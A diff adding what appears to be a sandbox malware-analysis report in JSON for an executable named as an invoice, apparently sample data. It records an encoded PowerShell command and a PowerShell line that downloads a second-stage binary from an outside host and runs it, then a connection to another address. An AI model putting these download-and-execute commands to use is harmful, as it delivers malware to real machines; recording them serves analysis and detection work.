@@ -1,0 +1,115 @@
+{
+  "report_metadata": {
+    "sandbox_name": "CAPE Sandbox",
+    "version": "2.4-community",
+    "report_format": "cape_json_v2",
+    "target": {
+      "file_name": "invoice_oct2026.exe",
+      "sha256": "7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069",
+      "file_size": 245760
+    },
+    "environment": {
+      "os": "Windows 10 21H2 x64",
+      "analysis_duration_seconds": 120,
+      "network_routing": "internet_simulated_inetsim_plus_wan"
+    },
+    "errors_or_warnings": []
+  },
+  "behavior": {
+    "processes": [
+      {
+        "process_id": 2488,
+        "parent_id": 1200,
+        "process_name": "invoice_oct2026.exe",
+        "command_line": "\"C:\\Users\\analyst\\AppData\\Local\\Temp\\invoice_oct2026.exe\"",
+        "first_seen": "2026-10-28T09:15:02.120Z",
+        "events_summary": {
+          "file_writes": 1,
+          "network_connections": 0
+        }
+      },
+      {
+        "process_id": 3920,
+        "parent_id": 2488,
+        "process_name": "cmd.exe",
+        "command_line": "cmd.exe /c \"powershell -enc JABzAD0ATgBlAHcALQBPAGIA... -ExecutionPolicy Bypass\"",
+        "first_seen": "2026-10-28T09:15:03.450Z",
+        "events_summary": {
+          "file_writes": 0,
+          "network_connections": 0
+        }
+      },
+      {
+        "process_id": 4156,
+        "parent_id": 3920,
+        "process_name": "powershell.exe",
+        "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"Invoke-WebRequest -Uri https://cloud-storage-cdn.net/stage2.bin -OutFile C:\\Users\\analyst\\AppData\\Local\\Temp\\update_payload.exe; Start-Process C:\\Users\\analyst\\AppData\\Local\\Temp\\update_payload.exe\"",
+        "first_seen": "2026-10-28T09:15:04.210Z",
+        "events_summary": {
+          "file_writes": 1,
+          "network_connections": 1
+        }
+      },
+      {
+        "process_id": 5204,
+        "parent_id": 4156,
+        "process_name": "update_payload.exe",
+        "command_line": "\"C:\\Users\\analyst\\AppData\\Local\\Temp\\update_payload.exe\"",
+        "first_seen": "2026-10-28T09:15:10.880Z",
+        "events_summary": {
+          "file_writes": 1,
+          "network_connections": 1
+        }
+      }
+    ],
+    "dropped": [
+      {
+        "name": "update_payload.exe",
+        "path": "C:\\Users\\analyst\\AppData\\Local\\Temp\\update_payload.exe",
+        "sha256": "a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0",
+        "size": 104448,
+        "type": "PE32 executable (GUI) Intel 80386",
+        "dropped_by_pid": 4156
+      },
+      {
+        "name": "mutex_flag.tmp",
+        "path": "C:\\Users\\analyst\\AppData\\Local\\Temp\\mutex_flag.tmp",
+        "sha256": "c5e8f1b2d49a37210e4fbc8712a0956487e41203876541290384756102938475",
+        "size": 16,
+        "type": "ASCII text",
+        "dropped_by_pid": 5204
+      }
+    ],
+    "network": {
+      "dns": [
+        {
+          "domain": "cloud-storage-cdn.net",
+          "resolved_ip": "198.51.100.42",
+          "query_type": "A"
+        }
+      ],
+      "http": [
+        {
+          "method": "GET",
+          "url": "https://cloud-storage-cdn.net/stage2.bin",
+          "status_code": 200,
+          "pid": 4156
+        }
+      ],
+      "tcp": [
+        {
+          "dst_ip": "198.51.100.42",
+          "dst_port": 443,
+          "pid": 4156,
+          "protocol": "HTTPS"
+        },
+        {
+          "dst_ip": "203.0.113.88",
+          "dst_port": 8080,
+          "pid": 5204,
+          "protocol": "TCP"
+        }
+      ]
+    }
+  }
+}
